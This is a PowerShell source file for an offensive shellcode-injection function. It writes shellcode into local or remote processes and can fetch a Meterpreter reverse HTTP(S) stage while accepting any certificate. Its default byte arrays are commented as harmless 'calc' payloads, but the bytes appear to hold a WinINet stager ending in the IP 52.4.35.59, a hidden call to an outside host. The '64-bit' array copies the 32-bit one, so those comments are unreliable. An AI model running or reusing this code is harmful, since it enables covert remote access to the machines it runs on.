function Invoke-Shellcode
{

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateSet( 'windows/meterpreter/reverse_http',
                  'windows/meterpreter/reverse_https',
                  IgnoreCase = $True )]
    [String]
    $Payload = 'windows/meterpreter/reverse_http',
    
    [Parameter( ParameterSetName = 'ListPayloads' )]
    [Switch]
    $ListMetasploitPayloads,
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Lhost = '127.0.0.1',
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateRange( 1,65535 )]
    [Int]
    $Lport = 8443,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [String]
    $UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0
    
    # List all available Metasploit payloads and exit the function
    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
    {
        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
            Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
    
        foreach ($Payload in $AvailablePayloads.ValidValues)
        {
            New-Object PSObject -Property @{ Payloads = $Payload }
        }
        
        Return
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
        {
            # Determine is the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr)
    {
    	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        
        $64bitCPU = $true
    }
    else
    {
    	$64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        if (!$PowerShell32bit) {
            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
            # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function

            # Pull out just the content of the this script's invocation.
            $RootInvocation = $MyInvocation.Line

            $Response = $True
        
            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                   "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
        
            if ( !$Response )
            {
                # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
                Return
            }

            # Since the shellcode will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
            if ($MyInvocation.BoundParameters['Force'])
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
            }
            else
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation -Force"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation) -Force`n`n"
            }

            $CommandBytes = [System.Text.Encoding]::Ascii.GetBytes($Command)
            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)

            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
            Invoke-Expression -Command $Execute | Out-Null

            # Exit the script since the shellcode will be running from x86 PowerShell
            Return
        }
        
        $Response = $True
        
        if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
        
        if ( !$Response )
        {
            # User opted not to carry out download of Metasploit payload. Exit function
            Return
        }
        
        switch ($Payload)
        {
            'windows/meterpreter/reverse_http'
            {
                $SSL = ''
            }
            
            'windows/meterpreter/reverse_https'
            {
                $SSL = 's'
                # Accept invalid certificates
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }
        }
        
        # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
        $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
        Write-Verbose "Requesting meterpreter payload from $Request"
        
        $Uri = New-Object Uri($Request)
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add('user-agent', "$UserAgent")
        
        try
        {
            [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
        }
        catch
        {
            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
        }
        [Byte[]] $Shellcode64 = $Shellcode32

    }
    elseif ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        # Pop a calc... or whatever shellcode you decide to place in here
        # I sincerely hope you trust that this shellcode actually pops a calc...
        # Insert your shellcode here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x34,0x2e,0x30,0x20,0x28,0x63,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x6c,0x65,0x3b,0x20,0x4d,0x53,0x49,0x45,0x20,0x38,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x35,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x34,0x2e,0x30,0x29,0x00,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x00,0x59,0x31,0xff,0x57,0x57,0x57,0x57,0x51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0x50,0x00,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xeb,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x74,0x48,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x75,0x04,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x79,0x71,0x5a,0x58,0x00,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x1d,0xff,0xff,0xff,0x35,0x32,0x2e,0x34,0x2e,0x33,0x35,0x2e,0x35,0x39,0x00
        )

        # 64-bit payload
        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
        [Byte[]] $Shellcode64 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xe8,0x80,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x34,0x2e,0x30,0x20,0x28,0x63,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x6c,0x65,0x3b,0x20,0x4d,0x53,0x49,0x45,0x20,0x38,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x35,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x34,0x2e,0x30,0x29,0x00,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x58,0x00,0x59,0x31,0xff,0x57,0x57,0x57,0x57,0x51,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5b,0x31,0xc9,0x51,0x51,0x6a,0x03,0x51,0x51,0x68,0x50,0x00,0x00,0x00,0x53,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc3,0xeb,0x7a,0x59,0x31,0xd2,0x52,0x68,0x00,0x32,0xa0,0x84,0x52,0x52,0x52,0x51,0x52,0x50,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x89,0xc6,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x31,0xff,0x57,0x57,0x57,0x57,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x74,0x48,0x31,0xff,0x85,0xf6,0x74,0x04,0x89,0xf9,0xeb,0x09,0x68,0xaa,0xc5,0xe2,0x5d,0xff,0xd5,0x89,0xc1,0x68,0x45,0x21,0x5e,0x31,0xff,0xd5,0x31,0xff,0x57,0x6a,0x07,0x51,0x56,0x50,0x68,0xb7,0x57,0xe0,0x0b,0xff,0xd5,0xbf,0x00,0x2f,0x00,0x00,0x39,0xc7,0x75,0x04,0x89,0xd8,0xeb,0x8a,0x31,0xff,0xeb,0x15,0xeb,0x49,0xe8,0x81,0xff,0xff,0xff,0x2f,0x79,0x71,0x5a,0x58,0x00,0x00,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x57,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0xe8,0x1d,0xff,0xff,0xff,0x35,0x32,0x2e,0x34,0x2e,0x33,0x35,0x2e,0x35,0x39,0x00
        )
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }
    
}
